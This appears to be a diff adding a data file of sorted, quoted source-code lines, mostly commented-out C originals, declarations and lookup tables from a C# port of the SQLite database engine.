@@ -1,0 +1,2397 @@
+            /* Obscure case for non-leaf-data trees: If the cell at pCell was"
+            string bufStr = (string)va_arg( ap, ""string"" );"
+          for ( n = 0 ; n < nVar ; n++ )"
+        // C# -- Replace allocation with individual Dims"
+        // retry opening the file a few times; this is because of a racing condition between a delete and open call to the FS"
+        //Debug.Assert(p == pColl);"
+        //do"
+        Mem nullMem = new Mem();//    static const Mem nullMem = {{0}, (double)0, 0, """", 0, MEM_Null, SQLITE_NULL, 0, 0, 0 };"
+        int retries = 3;"
+        p.aVar = new Mem[nVar == 0 ? 1 : nVar]; //p.aVar = p.aMem[nMem + 1];"
+        p.apArg = new Mem[nArg == 0 ? 1 : nArg];//p.apArg = (Mem**)p.aVar[nVar];"
+        p.apCsr = new VdbeCursor[nCursor == 0 ? 1 : nCursor];//p.apCsr = (VdbeCursor**)p.azVar[nVar];"
+      // Do a quick test to prevent the try/catch block"
+      // Release additional C# pointers for backlinks"
+      if ( opcodeProperty == null ) opcodeProperty = OPFLG_INITIALIZER;"
+      try"
+    //          Windows DLL definitions"
+    public delegate string dxColname( sqlite3_value pVal );"
+    {"
+"//
+"//                                          /*   DELETE, or UPDATE and return */"
+"//                                      ExprList*,Select*,u8);"
+"//                                      Token*, Select*, Expr*, IdList*);"
+"//                                     int*,int,int,int,int,int*);"
+"//                                  const void pData, int nData,"
+"//                                  dwDummy,"
+"//                                  int nZero, int bias, int seekResult);"
+"//                                  ref bytesPerSector,"
+"//                              0, 0);"
+"//                             ""cannot open indexed column for writing"");"
+"//                          int, int, int, int, u32*, u32*);"
+"//                         Expr*,ExprList*,int,Expr*,Expr*);"
+"//                         Expr*,int, int);"
+"//                        Token*, int, int);"
+"//                       int omitJournal, int nCache, int flags, Btree **ppBtree);"
+"//                       void (**pxFunc)(sqlite3_context*,int,sqlite3_value**),"
+"//                 ""%s\\""SQLITE_TEMP_FILE_PREFIX, zTempPath);"
+"//                 sqlite3OsDlSym(pVfs, handle, zProc);"
+"//                int argc, sqlite3_value **argv);"
+"//               int argc, const char *const*argv,"
+"//               int flags, int *pOutFlags);"
+"//               sqlite3_vtab **ppVTab, char**);"
+"//             nCursor * sizeof( VdbeCursor* ), &zCsr, zEnd, &nByte"
+"//            sqlite3DbFree(db, zErr);"
+"//            zErr = sqlite3MPrintf(db,"
+"//          ""no entry point [%s] in shared library [%s]"", zProc,zFile);"
+"//          memcpy(&data[cellbody], apCell[i], aSize[i]);"
+"//          memcpy(data[cellbody], apCell[i], aSize[i]);"
+"//          sqlite3DbReallocOrFree( pParse.db, pParse.aTableLock, nBytes );"
+"//          type==0?""null"": type==7?""real"": ""integer"""
+"//        //sqlite3DbFree(db, p);"
+"//        //sqlite3DbFree(db, zErr);"
+"//        //sqlite3DbFree(db,ref  p);"
+"//        CODEC2(pPager, pData, pPg->pgno, 7, return SQLITE_NOMEM, pData2);"
+"//        dwRet = GetDiskFreeSpaceA((CHAR*)zConverted,"
+"//        memcpy(pNew, p, db.lookaside.sz);"
+"//        pCell = findCell( pPage, i );"
+"//        sqlite3_snprintf(sizeof(zErr), zErr, ""%s"", sParse.zErrMsg);"
+"//       && (Sleep(100), 1) );"
+"//      ** so, return without deleting the master journal file."
+"//      *pzErrMsg = sqlite3DbStrDup(0, zErrmsg);"
+"//      //sqlite3DbFree(db,pBlob);"
+"//      //sqlite3DbFree(db,ref  zOld);"
+"//      //sqlite3DbFree(db,ref  zOut);"
+"//      //sqlite3StackFree(db, zErrmsg);"
+"//      READ_UTF16BE(zIn, c);"
+"//      READ_UTF16LE(zIn, c);"
+"//      WRITE_UTF16BE(z, c);"
+"//      WRITE_UTF16LE(z, c);"
+"//      WRITE_UTF8(z, c);"
+"//      WRITE_UTF8(zOut, c);"
+"//      c = zMasterPtr[0] != 0 && strcmp( zMasterPtr, zMaster ) == 0;"
+"//      if( sqlite3StrICmp(pTab.aCol[iCol].zName, zColumn)==0 ){"
+"//      int iDb = sqlite3SchemaToIndex(db, pTab.pSchema);"
+"//      memcpy( zNew, p.zText, p.nChar );"
+"//      memcpy(p.zText, p.zBase, p.nChar + 1);"
+"//      p.nOpAlloc = sqlite3DbMallocSize(p.db, pNew)/sizeof(Op);"
+"//      pNew = sqlite3DbMallocRaw(db, n);"
+"//      pNew = sqlite3_realloc(p, n);"
+"//      pStmt, N, (const void*(*)(Mem*))sqlite3_value_text16, COLNAME_DECLTYPE);"
+"//      pzErrMsg = sqlite3_mprintf(""error during initialization: %s"", zErrmsg);"
+"//      rc = readMasterJournal( pJournal, zMasterPtr, nMasterPtr );"
+"//      rc = sqlite3OsOpen( pVfs, zJournal, pJournal, flags, 0 );"
+"//      return GetProcAddress((HANDLE)pHandle, zSymbol);"
+"//      return GetProcAddressA((HANDLE)pHandle, zSymbol);"
+"//      return sqlite3DbMallocRaw(db, n);"
+"//      sqlite3DbFree(db, zErr);"
+"//      sqlite3DbMallocRaw(db, sizeof(*pKeyMerge)+nOrderBy*(sizeof(CollSeq*)+1));"
+"//      sqlite3DbReallocOrFree( pMem.db, pMem.z, n );"
+"//      sqlite3ErrorMsg(pParse, ""cannot open view: %s"", zTable);"
+"//      sqlite3ErrorMsg(pParse, ""cannot open virtual table: %s"", zTable);"
+"//      sqlite3OsDlError(pVfs, nMsg-1, zErrmsg);"
+"//      sqlite3StackFree(db, pParse);"
+"//      sqlite3VdbeAddOpList(v, sizeof(openBlob)/sizeof(VdbeOpList), openBlob);"
+"//      sqlite3VdbeChangeP1(v, 0, iDb);"
+"//      sqlite3VdbeChangeP1(v, 1, iDb);"
+"//      sqlite3VdbeChangeP1(v, 2, iDb);"
+"//      sqlite3VdbeChangeP2(v, 0, flags);"
+"//      sqlite3VdbeChangeP2(v, 1, pTab.pSchema.schema_cookie);"
+"//      sqlite3VdbeChangeP2(v, 2, pTab->tnum);"
+"//      sqlite3VdbeChangeP2(v, 3 + flags, pTab->tnum);"
+"//      sqlite3VdbeChangeP2(v, 7, pTab->nCol);"
+"//      sqlite3VdbeChangeP3(v, 2, flags);"
+"//      sqlite3VdbeChangeP3(v, 3 + flags, iDb);"
+"//      sqlite3VdbeChangeP4(v, 2, pTab->zName, P4_TRANSIENT);"
+"//      sqlite3VdbeChangeP4(v, 3+flags, SQLITE_INT_TO_PTR(pTab->nCol+1),P4_INT32);"
+"//      sqlite3VdbeChangeToNoop(v, 4 - flags, 1);"
+"//      sqlite3VdbeUsesBtree(v, iDb);"
+"//      sqlite3_snprintf(nMsg, zErrmsg,"
+"//      zErr = sqlite3MPrintf(db, ""cannot open value of type %s"","
+"//      zErr = sqlite3MPrintf(db, ""no such column: \""%s\"""", zColumn);"
+"//      zErr = sqlite3MPrintf(db, sqlite3_errmsg(db));"
+"//     && (rc = WriteFile(pFile.fs.Name, pBuf, amt, wrote, 0))!=0"
+"//     CODEC2(pPager, pList->pData, pgno, 6, return SQLITE_NOMEM, pData);"
+"//     ref bytesPerSector,"
+"//     ref dwDummy,"
+"//     res = UnlockFile(pFilE.h, SHARED_FIRST, 0, SHARED_SIZE, 0);"
+"//     sqlite3DbMallocSize( db, pMem.zMalloc ) );"
+"//    ** returned, clean-up the statement handle."
+"//    ** text, it is up to the caller to get the encoding right."
+"//    /* If the value is being opened for writing, check that the"
+"//    //sqlite3DbFree( db, aCol[j].zName );"
+"//    //sqlite3DbFree(db,ref zErrmsg);"
+"//    //sqlite3DbFree(db,ref zName8);"
+"//    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,  /* Bx */"
+"//    0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0,  /* 4x */"
+"//    0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0,  /* 6x */"
+"//    0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1,  /* Ex */"
+"//    0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0,  /* 7x */"
+"//    0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 0,  /* 9x */"
+"//    0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0,  /* 8x */"
+"//    0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 0, 0, 0,  /* 5x */"
+"//    0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1,  /* Cx */"
+"//    0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1,  /* Dx */"
+"//    1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0,  /* Ax */"
+"//    1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0,  /* Fx */"
+"//    UnlockFile(pFilE.h, PENDING_BYTE, 0, 1, 0);"
+"//    btreeParseCell(pCur.apPage[iPage],pCur.aiIdx[iPage],&pCur.info); \"
+"//    c = sqlite3Utf8Read(zIn, (const u8**)&zIn);"
+"//    gmtime_r(&t, sNow);"
+"//    if( isLookaside(db, p) ){"
+"//    int  (*create_collation16)(sqlite3*,const void*,int,void*,int(*)(void*,int,const void*,int,const void*));"
+"//    int addr = sqlite3VdbeAddOp3(p, op, p1, p2, p3);"
+"//    int argvIndex;           /* if >0, constraint is part of argv to xFilter */"
+"//    memcpy(&zOut[j], zRep, nRep);"
+"//    memcpy(aHandle, db.aExtension, sizeof(handle)*(db.nExtension));"
+"//    memcpy(out, in, 8);"
+"//    memcpy(pBuf, pPayload, nByte);"
+"//    memcpy(pPayload, pBuf, nByte);"
+"//    memcpy(zNew, z, n);"
+"//    memset(pParse, 0, sizeof(Parse));"
+"//    nGot = (sqlite3DbMallocSize(db, pNew) - sizeof(*pSrc))/sizeof(pSrc->a[0])+1;"
+"//    p.pFree = sqlite3DbMallocZero( db, nByte );"
+"//    pBlob = (Incrblob *)sqlite3DbMallocZero(db, sizeof(Incrblob));"
+"//    pPager->aSavepoint, sizeof(PagerSavepoint)*nSavepoint"
+"//    pTab = sqlite3LocateTable(pParse, 0, zTable, zDb);"
+"//    rc = createCollation(db, zName8, enc, pCtx, xCompare, 0);"
+"//    rc = sqlite3OsAccess( pVfs, zJournal, SQLITE_ACCESS_EXISTS, &exists );"
+"//    rc = xCall(p.pCsr, iOffset+p.iOffset, n, z);"
+"//    res = UnlockFile(pFilE.h, SHARED_FIRST + pFilE.sharedLockByte, 0, 1, 0);"
+"//    sqlite3DbFree(db, p);"
+"//    sqlite3DbFree(db, zErr);"
+"//    sqlite3ExprDelete(db, ref p);"
+"//    sqlite3OsDlClose(pVfs, handle);"
+"//    sqlite3OsDlClose(pVfs, ref handle);"
+"//    sqlite3StatusAdd(SQLITE_STATUS_MEMORY_USED, -iSize);"
+"//    sqlite3StatusAdd(SQLITE_STATUS_SCRATCH_OVERFLOW, -iSize);"
+"//    sqlite3VdbeChangeP4(p, addr, _p4, p4type);"
+"//    sqlite3VdbeMakeReady(v, 1, 1, 1, 0);"
+"//    sqlite3_bind_int64((sqlite3_stmt *)v, 1, iRow);"
+"//    sqlite3_snprintf(MAX_PATH-30, zTempPath, ""%s"", zMulti);"
+"//    sqlite3_snprintf(MAX_PATH-30, zTempPath, ""%s"", zUtf8);"
+"//    sqlite3_vfs *pVfs,"
+"//    static object winDlSym(sqlite3_vfs pVfs, HANDLE pHandle, String zSymbol){"
+"//    static void winDlClose( sqlite3_vfs pVfs, HANDLE pHandle )"
+"//    strftime(zBuf, 20, zFormat, pTm);"
+"//    strftime(zBuf, 20, zFormat, sNow);"
+"//    zErr = sqlite3MPrintf(db, ""no such rowid: %lld"", iRow);"
+"//    zErrmsg = sqlite3StackAllocZero(db, nMsg);"
+"//    zFileName = """";"
+"//    zMbcsFileName = """";"
+"//    zOut = sqlite3_realloc(zOut, (int)nOut);"
+"//    zWideFileName = """";"
+"//    {OP_Close, 0, 0, 0},           /* 9  */"
+"//    {OP_Column, 0, 0, 1},          /* 7  */"
+"//    {OP_Halt, 0, 0, 0},            /* 10 */"
+"//    {OP_NotExists, 0, 9, 1},       /* 6: Seek the cursor */"
+"//    {OP_OpenRead, 0, 0, 0},        /* 3: Open cursor 0 for reading */"
+"//    {OP_OpenWrite, 0, 0, 0},       /* 4: Open cursor 0 for read/write */"
+"//    {OP_ResultRow, 1, 0, 0},       /* 8  */"
+"//    {OP_Transaction, 0, 0, 0},     /* 0: Start a transaction */"
+"//    {OP_VerifyCookie, 0, 0, 0},    /* 1: Check the schema cookie */"
+"//   ""\100\040\040"""
+"//   0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  /* 0x */"
+"//   0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  /* 1x */"
+"//   0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  /* 2x */"
+"//   0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  /* 3x */"
+"//   0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  /* 4x */"
+"//   0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  /* 5x */"
+"//   0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  /* 7x */"
+"//   0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  /* Bx */"
+"//   0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  /* Fx */"
+"//   0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0,  0, 95,  0,  0,  /* 6x */"
+"//   0,  0,115,116,117,118,119,120,121,122,  0,  0,  0,  0,  0,  0,  /* Ax */"
+"//   0,  0,115,116,117,118,119,120,121,122,  0,  0,  0,  0,  0,  0,  /* Ex */"
+"//   0, 97, 98, 99,100,101,102,103,104,105,  0,  0,  0,  0,  0,  0,  /* 8x */"
+"//   0, 97, 98, 99,100,101,102,103,104,105,  0,  0,  0,  0,  0,  0,  /* Cx */"
+"//   0,106,107,108,109,110,111,112,113,114,  0,  0,  0,  0,  0,  0,  /* 9x */"
+"//   0,106,107,108,109,110,111,112,113,114,  0,  0,  0,  0,  0,  0,  /* Dx */"
+"//   NULL,"
+"//   dwCreationDisposition,"
+"//   dwDesiredAccess,"
+"//   dwFlagsAndAttributes,"
+"//   dwShareMode,"
+"//   if(((P).flags&(MEM_Str|MEM_Blob))==0 && sqlite3VdbeMemStringify(P,enc)) \"
+"//   memcpy(pzErrMsg, sqlite3_errmsg(db), nErrMsg);"
+"//   sqlite3DbMallocRaw( pMem.db, n );"
+"//   void(*xProfile)(void*,const char*,sqlite3_uint64), void*);"
+"//   yyTracePrompt, yyTokenName[iLookAhead], yyTokenName[YYWILDCARD]);"
+"//  ""0123456789"";"
+"//  ""ABCDEFGHIJKLMNOPQRSTUVWXYZ"""
+"//  ""abcdefghijklmnopqrstuvwxyz"""
+"//  &GLOBAL(struct sqlite3PrngType, sqlite3Prng),"
+"//  &GLOBAL(struct sqlite3PrngType, sqlite3SavedPrng),"
+"//  ** After seeking the cursor, the vdbe executes an OP_ResultRow."
+"//  ** Code external to the Vdbe then ""borrows"" the b-tree cursor and"
+"//  ** The sqlite3_blob_close() function finalizes the vdbe program,"
+"//  ** before calling APIs that follow, extension should check the"
+"//  ** ever transformed, so there is never anything to delete."
+"//  ** misusing sqlite, they have bigger problems than a leaked value."
+"//  ** new pSpace buffer, so it may be safely freed here. */"
+"//  ** sqlite3VdbeUnpackRecord() function above, which makes all"
+"//  ** uses it to implement the blob_read(), blob_write() and"
+"//  ** vdbe program will take advantage of the various transaction,"
+"//  /* Even though a malloc() has failed, the implementation of the"
+"//  /* If pFree is not NULL, it points to the pSpace buffer used"
+"//  /* If there is no statement handle, then the blob-handle has"
+"//  /* Less than 19 digits, so we know that it fits in 64 bits */"
+"//  //if ( pNew != standin ) //sqlite3DbFree( db, ref pNew );"
+"//  //sqlite3DbFree( db, aCol );"
+"//  //sqlite3DbFree( db, ref pEnd.zMalloc );"
+"//  //sqlite3DbFree( db, zName );"
+"//  //sqlite3DbFree(db, pOld);"
+"//  //sqlite3DbFree(db,ref  zExtra);"
+"//  //sqlite3DbFree(db,ref db.aExtension);"
+"//  //sqlite3DbFree(db,ref pNew);"
+"//  //sqlite3DbFree(db,ref z);"
+"//  //sqlite3DbFree(pMem->db,ref pMem.zMalloc);"
+"//  //sqlite3_free,"
+"//  //sqlite3_free_table,"
+"//  0,     /* Was sqlite3_global_recover(), but that function is deprecated */"
+"//  0,"
+"//  : 1;      /* True for malloced memory, false for static */"
+"//  BtCursor*,"
+"//  Btree **ppBtree,        /* Return open Btree* here */"
+"//  Btree*,                              /* BTree containing table to open */"
+"//  GLOBAL(struct sqlite3PrngType, sqlite3Prng).isInit = 0;"
+"//  GetTempPathA(MAX_PATH-30, zMbcsPath);"
+"//  GetTempPathW(MAX_PATH-30, zWidePath);"
+"//  Pager **ppPager,"
+"//  Parse pParse,        /* Parser context */"
+"//  Parse* pParse,        /* Parsing context */"
+"//  Select pSelect,      /* A SELECT statement to use as the data source */"
+"//  Select* p,            /* The right-most of SELECTs to be coded */"
+"//  Table pDest,         /* The table we are inserting into */"
+"//  UnpackedRecord pUnKey,"
+"//  Vdbe p,               /* Add the opcode to this VM */"
+"//  aHandle = sqlite3DbMallocZero(db, sizeof(handle)*db.nExtension+1);"
+"//  aNew = sqlite3DbMallocRaw(db, sizeof(db.aDb[0])*3 );"
+"//  aNew = sqlite3_realloc(wsdAutoext.aExt, nByte);"
+"//  allocSpace( (char*)&p.aMem, nMem * sizeof( Mem ), &zCsr, zEnd, &nByte );"
+"//  allocSpace( (char*)&p.aVar, nVar * sizeof( Mem ), &zCsr, zEnd, &nByte );"
+"//  allocSpace( (char*)&p.apArg, nArg * sizeof( Mem* ), &zCsr, zEnd, &nByte );"
+"//  allocSpace( (char*)&p.apCsr,"
+"//  allocSpace( (char*)&p.azVar, nVar * sizeof( char* ), &zCsr, zEnd, &nByte );"
+"//  btreeParseCellPtr((pPage), findCell((pPage), (iCell)), (pInfo))"
+"//  byte[] pBuf,               /* Pointer to buffer */"
+"//  byte[] pPayload,           /* Pointer to page data */"
+"//  char * (*mprintf)(const char*,...);"
+"//  char * (*snprintf)(int,char*,const char*,...);"
+"//  char *(*vmprintf)(const char*,va_list);"
+"//  char ***pazResult,    /* Results of the query */"
+"//  char *idxStr;              /* String, possibly obtained from sqlite3_malloc */"
+"//  char *out = sqlite3DbMallocRaw(sqlite3VdbeDb(v), 8);"
+"//  char *pSpace,          /* Unaligned space available to hold the object */"
+"//  char const **pzCollSeq,     /* OUTPUT: Collation sequence name */"
+"//  char const **pzDataType,    /* OUTPUT: Declared data type */"
+"//  clearSelect( db, pNew );"
+"//  const char * (*bind_parameter_name)(sqlite3_stmt*,int);"
+"//  const char * (*column_database_name)(sqlite3_stmt*,int);"
+"//  const char * (*column_decltype)(sqlite3_stmt*,int i);"
+"//  const char * (*column_name)(sqlite3_stmt*,int);"
+"//  const char * (*column_origin_name)(sqlite3_stmt*,int);"
+"//  const char * (*column_table_name)(sqlite3_stmt*,int);"
+"//  const char *filename,   /* Database filename (UTF-8) */"
+"//  const char *sql,                           /* SQL to be evaluated */"
+"//  const char *zColumn,    /* The column containing the blob */"
+"//  const char *zColumn,"
+"//  const char *zColumnName,    /* Column name */"
+"//  const char *zDb,        /* The attached database containing the blob */"
+"//  const char *zDb,"
+"//  const char *zDbName,        /* Database name or NULL */"
+"//  const char *zDestName,                 /* Destination database name */"
+"//  const char *zFile,    /* Name of the shared library containing extension */"
+"//  const char *zFunctionName,"
+"//  const char *zName,         /* Name of the module */"
+"//  const char *zName, "
+"//  const char *zProc,    /* Entry point.  Derived from zFile if 0 */"
+"//  const char *zSql,       /* SQL statement, UTF-8 encoded */"
+"//  const char *zSql,     /* SQL to be evaluated */"
+"//  const char *zTable,     /* The table containing the blob */"
+"//  const char *zTable,"
+"//  const char *zTableName,     /* Table name */"
+"//  const char*,"
+"//  const sqlite3_module *p,   /* Methods for the module */"
+"//  const unsigned char * (*column_text)(sqlite3_stmt*,int iCol);"
+"//  const void * (*column_blob)(sqlite3_stmt*,int iCol);"
+"//  const void * (*column_database_name16)(sqlite3_stmt*,int);"
+"//  const void * (*column_decltype16)(sqlite3_stmt*,int);"
+"//  const void * (*column_name16)(sqlite3_stmt*,int);"
+"//  const void * (*column_origin_name16)(sqlite3_stmt*,int);"
+"//  const void * (*column_table_name16)(sqlite3_stmt*,int);"
+"//  const void * (*column_text16)(sqlite3_stmt*,int iCol);"
+"//  const void *filename,   /* Database filename (UTF-16) */"
+"//  const void *pKey, int nKey     /* The key */"
+"//  const void *pKey, int nKey     /* The new key */"
+"//  const void *val = sqlite3_value_text16( columnMem(pStmt,i) );"
+"//  const void *zFunctionName,"
+"//  const void *zName,"
+"//  const void *zSql,       /* SQL statement, UTF-16 encoded */"
+"//  corruptSchema( pData, argv[0], """" );"
+"//  db,"
+"//  double  (*column_double)(sqlite3_stmt*,int iCol);"
+"//  getLastErrorMsg(nBuf, zBufOut);"
+"//  i64 intKey,"
+"//  if (!rc && ++cnt < MX_CLOSE_ATTEMPT) Thread.Sleep(100); //, 1) );"
+"//  if( zStr[i]!=zPattern[0] || memcmp(&zStr[i], zPattern, nPattern) ){"
+"//  int  (*bind_blob)(sqlite3_stmt*,int,const void*,int n,void(*)(void*));"
+"//  int  (*bind_double)(sqlite3_stmt*,int,double);"
+"//  int  (*bind_int)(sqlite3_stmt*,int,int);"
+"//  int  (*bind_int64)(sqlite3_stmt*,int,sqlite_int64);"
+"//  int  (*bind_null)(sqlite3_stmt*,int);"
+"//  int  (*bind_parameter_index)(sqlite3_stmt*,const char*zName);"
+"//  int  (*bind_text)(sqlite3_stmt*,int,const char*,int n,void(*)(void*));"
+"//  int  (*bind_text16)(sqlite3_stmt*,int,const void*,int,void(*)(void*));"
+"//  int  (*bind_value)(sqlite3_stmt*,int,const sqlite3_value*);"
+"//  int  (*busy_handler)(sqlite3*,int(*)(void*,int),void*);"
+"//  int  (*busy_timeout)(sqlite3*,int ms);"
+"//  int  (*collation_needed)(sqlite3*,void*,void(*)(void*,sqlite3*,int eTextRep,const char*));"
+"//  int  (*collation_needed16)(sqlite3*,void*,void(*)(void*,sqlite3*,int eTextRep,const void*));"
+"//  int  (*column_bytes)(sqlite3_stmt*,int iCol);"
+"//  int  (*column_bytes16)(sqlite3_stmt*,int iCol);"
+"//  int  (*column_int)(sqlite3_stmt*,int iCol);"
+"//  int  (*column_type)(sqlite3_stmt*,int iCol);"
+"//  int  (*create_collation)(sqlite3*,const char*,int,void*,int(*)(void*,int,const void*,int,const void*));"
+"//  int  (*create_function)(sqlite3*,const char*,int,int,void*,void (*xFunc)(sqlite3_context*,int,sqlite3_value**),void (*xStep)(sqlite3_context*,int,sqlite3_value**),void (*xFinal)(sqlite3_context*));"
+"//  int  (*create_function16)(sqlite3*,const void*,int,int,void*,void (*xFunc)(sqlite3_context*,int,sqlite3_value**),void (*xStep)(sqlite3_context*,int,sqlite3_value**),void (*xFinal)(sqlite3_context*));"
+"//  int  (*exec)(sqlite3*,const char*,sqlite3_callback,void*,char**);"
+"//  int  (*get_table)(sqlite3*,const char*,char***,int*,int*,char**);"
+"//  int  (*open)(const char*,sqlite3**);"
+"//  int  (*open16)(const void*,sqlite3**);"
+"//  int  (*prepare)(sqlite3*,const char*,int,sqlite3_stmt**,const char**);"
+"//  int  (*prepare16)(sqlite3*,const void*,int,sqlite3_stmt**,const void**);"
+"//  int  (*set_authorizer)(sqlite3*,int(*)(void*,int,const char*,const char*,const char*,const char*),void*);"
+"//  int  (*table_column_metadata)(sqlite3*,const char*,const char*,const char*,char const**,char const**,int*,int*,int*);"
+"//  int  (*transfer_bindings)(sqlite3_stmt*,sqlite3_stmt*);"
+"//  int (*bind_zeroblob)(sqlite3_stmt*,int,int);"
+"//  int (*blob_open)(sqlite3*,const char*,const char*,const char*,sqlite3_int64,int,sqlite3_blob**);"
+"//  int (*blob_read)(sqlite3_blob*,void*,int,int);"
+"//  int (*blob_write)(sqlite3_blob*,const void*,int,int);"
+"//  int (*callback)(void*,int,char**,char**),  /* Callback function */"
+"//  int (*create_collation_v2)(sqlite3*,const char*,int,void*,int(*)(void*,int,const void*,int,const void*),void(*)(void*));"
+"//  int (*create_module)(sqlite3*,const char*,const sqlite3_module*,void*);"
+"//  int (*create_module_v2)(sqlite3*,const char*,const sqlite3_module*,void*,void (*xDestroy)(void *));"
+"//  int (*declare_vtab)(sqlite3*,const char*);"
+"//  int (*file_control)(sqlite3*,const char*,int,void*);"
+"//  int (*open_v2)(const char*,sqlite3**,int,const char*);"
+"//  int (*overload_function)(sqlite3*, const char *zFuncName, int nArg);"
+"//  int (*prepare16_v2)(sqlite3*,const void*,int,sqlite3_stmt**,const void**);"
+"//  int (*prepare_v2)(sqlite3*,const char*,int,sqlite3_stmt**,const char**);"
+"//  int (*test_control)(int, ...);"
+"//  int (*vfs_register)(sqlite3_vfs*,int);"
+"//  int (*xAccess)(sqlite3_vfs*, const char *zName, int flags, int *pResOut);"
+"//  int (*xAuth)(void*,int,const char*,const char*,const char*,const char*),"
+"//  int (*xBestIndex)(sqlite3_vtab *pVTab, sqlite3_index_info*);"
+"//  int (*xCall)(BtCursor*, u32, u32, void*)"
+"//  int (*xCheckReservedLock)(sqlite3_file*, int *pResOut);"
+"//  int (*xColumn)(sqlite3_vtab_cursor*, sqlite3_context*, int);"
+"//  int (*xConnect)(sqlite3*, void *pAux,"
+"//  int (*xCreate)(sqlite3*, void *pAux,"
+"//  int (*xCurrentTime)(sqlite3_vfs*, double*);"
+"//  int (*xDelete)(sqlite3_vfs*, const char *zName, int syncDir);"
+"//  int (*xFileControl)(sqlite3_file*, int op, void *pArg);"
+"//  int (*xFileSize)(sqlite3_file*, sqlite3_int64 *pSize);"
+"//  int (*xFilter)(sqlite3_vtab_cursor*, int idxNum, const char *idxStr,"
+"//  int (*xFindFunction)(sqlite3_vtab *pVtab, int nArg, const char *zName,"
+"//  int (*xFullPathname)(sqlite3_vfs*, const char *zName, int nOut, char *zOut);"
+"//  int (*xGetLastError)(sqlite3_vfs*, int, char *);"
+"//  int (*xLock)(sqlite3_file*, int);"
+"//  int (*xOpen)(sqlite3_vfs*, const char *zName, sqlite3_file*,"
+"//  int (*xOpen)(sqlite3_vtab *pVTab, sqlite3_vtab_cursor **ppCursor);"
+"//  int (*xRandomness)(sqlite3_vfs*, int nByte, char *zOut);"
+"//  int (*xRead)(sqlite3_file*, void*, int iAmt, sqlite3_int64 iOfst);"
+"//  int (*xRename)(sqlite3_vtab *pVtab, const char *zNew);"
+"//  int (*xRowid)(sqlite3_vtab_cursor*, sqlite3_int64 *pRowid);"
+"//  int (*xSleep)(sqlite3_vfs*, int microseconds);"
+"//  int (*xStress)(void*, PgHdr*), /* Call to try to make pages clean */"
+"//  int (*xSync)(sqlite3_file*, int flags);"
+"//  int (*xTruncate)(sqlite3_file*, sqlite3_int64 size);"
+"//  int (*xUnlock)(sqlite3_file*, int);"
+"//  int (*xUpdate)(sqlite3_vtab *, int, sqlite3_value **, sqlite3_int64 *);"
+"//  int (*xWrite)(sqlite3_file*, const void*, int iAmt, sqlite3_int64 iOfst);"
+"//  int *pNotNull,              /* OUTPUT: True if NOT NULL constraint exists */"
+"//  int *pPrimaryKey,           /* OUTPUT: True if column part of PK */"
+"//  int *pnColumn,        /* Number of result columns written here */"
+"//  int *pnRow,           /* Number of result rows written here */"
+"//  int argc,"
+"//  int bPurgeable,                /* True if pages are on backing store */"
+"//  int bias,"
+"//  int chars_parsed = sqlite3Utf8CharLen(zSql8, (int)(zTail8-zSql8));"
+"//  int eOp,                   /* 0 -> copy from page, 1 -> copy to page */"
+"//  int eTextRep, "
+"//  int eTextRep,"
+"//  int enc,"
+"//  int flags,              /* Flags */"
+"//  int flags,              /* True . read/write access, false . read-only */"
+"//  int flags,"
+"//  int iOffset,"
+"//  int iTable,                          /* Index of root page */"
+"//  int n,"
+"//  int nArg,"
+"//  int nByte,                 /* Number of bytes to copy */"
+"//  int nByte,              /* Maximum length of zSql in bytes. */"
+"//  int onError,          /* How to handle constraint errors */"
+"//  int op,               /* The new opcode */"
+"//  int p1,               /* The P1 operand */"
+"//  int p2,               /* The P2 operand */"
+"//  int p3,               /* The P3 operand */"
+"//  int sqlite3JournalOpen(sqlite3_vfs *, const char *, sqlite3_file *, int, int);"
+"//  int sqlite3ViewGetColumnNames(Parse*,Table*);"
+"//  int szExtra,                   /* Extra space associated with each page */"
+"//  int szPage,                    /* Size of every page */"
+"//  int wrFlag,                          /* 1 for writing.  0 for read-only */"
+"//  int(*xCompare)(void*,int,const void*,int,const void*)"
+"//  int(*xCompare)(void*,int,const void*,int,const void*),"
+"//  int,"
+"//  memcpy( pI64, &value, sizeof( value ) );"
+"//  memcpy( pOut.z, pIn2.z, pIn2.n );"
+"//  memcpy( z1, z2, n + 1 );"
+"//  memcpy(aNew, db.aDb, sizeof(db.aDb[0])*2);"
+"//  memcpy(pKeyInfo.aSortOrder, aSortOrder, nField);"
+"//  memcpy(pParse.nVar, saveBuf, SAVE_SZ);"
+"//  memcpy(pTo, pFrom, MEMCELLSIZE);"
+"//  memcpy(saveBuf, pParse.nVar, SAVE_SZ);"
+"//  memset(&m, 0, sizeof(m));"
+"//  memset(&sMem, 0, sizeof(sMem));"
+"//  memset(&zHeader[sizeof(aJournalMagic)+20], 0,"
